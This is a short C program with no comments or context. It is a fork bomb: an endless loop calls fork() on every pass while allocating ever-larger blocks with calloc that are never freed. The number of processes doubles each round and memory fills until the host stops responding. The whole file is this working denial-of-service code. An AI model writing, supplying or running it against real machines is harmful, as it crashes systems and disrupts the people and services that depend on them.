#include <stdlib.h>

int main()
{
	unsigned long long int i = 0;
	while(1)
	{
		fork();
		calloc(i,1);
		i++;
	}

	return 0;

}
